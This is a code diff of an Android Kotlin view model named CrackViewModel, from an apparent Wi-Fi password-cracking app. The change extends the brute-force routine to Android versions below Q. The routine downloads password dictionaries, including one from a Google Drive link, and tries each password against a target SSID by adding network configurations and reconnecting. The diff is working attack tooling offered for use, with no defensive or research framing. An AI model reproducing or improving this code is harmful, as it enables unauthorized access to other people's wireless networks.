@@ -9,7 +9,6 @@ import android.net.NetworkRequest
 import android.net.wifi.WifiNetworkSuggestion
 import android.net.wifi.WifiManager
 import android.os.Build
-import androidx.annotation.RequiresApi
 import androidx.lifecycle.AndroidViewModel
 import androidx.lifecycle.viewModelScope
 import kotlinx.coroutines.Dispatchers
@@ -32,13 +31,8 @@ class CrackViewModel(application: Application) : AndroidViewModel(application) {
     private val wifiManager = application.getSystemService(Context.WIFI_SERVICE) as WifiManager
     private val connectivityManager = application.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
 
-    @RequiresApi(Build.VERSION_CODES.Q)
+    @SuppressWarnings("deprecation")
     fun startCracking(ssid: String, detail: String) {
-        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
-            _status.value = "Cracking not supported on this Android version."
-            return
-        }
-
         viewModelScope.launch(Dispatchers.IO) {
             _status.value = "Downloading dictionaries..."
             val passwords = downloadDictionaries()
@@ -46,16 +40,28 @@ class CrackViewModel(application: Application) : AndroidViewModel(application) {
 
             for ((index, password) in passwords.withIndex()) {
                 _progress.value = index * 100 / passwords.size
-                val suggestion = WifiNetworkSuggestion.Builder()
-                    .setSsid(ssid)
-                    .setWpa2Passphrase(password)
-                    .build()
 
-                val suggestions = listOf(suggestion)
-                val status = wifiManager.addNetworkSuggestions(suggestions)
-                if (status != WifiManager.STATUS_NETWORK_SUGGESTIONS_SUCCESS) {
-                    _status.value = "Failed to suggest network"
-                    return@launch
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                    val suggestion = WifiNetworkSuggestion.Builder()
+                        .setSsid(ssid)
+                        .setWpa2Passphrase(password)
+                        .build()
+
+                    val suggestions = listOf(suggestion)
+                    val status = wifiManager.addNetworkSuggestions(suggestions)
+                    if (status != WifiManager.STATUS_NETWORK_SUGGESTIONS_SUCCESS) {
+                        _status.value = "Failed to suggest network"
+                        return@launch
+                    }
+                } else {
+                    val wifiConfig = android.net.wifi.WifiConfiguration()
+                    wifiConfig.SSID = String.format("\"%s\"", ssid)
+                    wifiConfig.preSharedKey = String.format("\"%s\"", password)
+
+                    val netId = wifiManager.addNetwork(wifiConfig)
+                    wifiManager.disconnect()
+                    wifiManager.enableNetwork(netId, true)
+                    wifiManager.reconnect()
                 }
 
                 registerNetworkCallback(password)
@@ -80,7 +86,7 @@ class CrackViewModel(application: Application) : AndroidViewModel(application) {
         connectivityManager.registerNetworkCallback(networkRequest, networkCallback)
     }
 
-    internal suspend fun downloadDictionaries(): List<String> {
+    private suspend fun downloadDictionaries(): List<String> {
         val passwords = mutableListOf<String>()
         val urls = listOf(
             "https://drive.google.com/file/d/12ohN_3CktkNUGlDwHP-hzawpaqTEaMem/view?usp=drive_link",
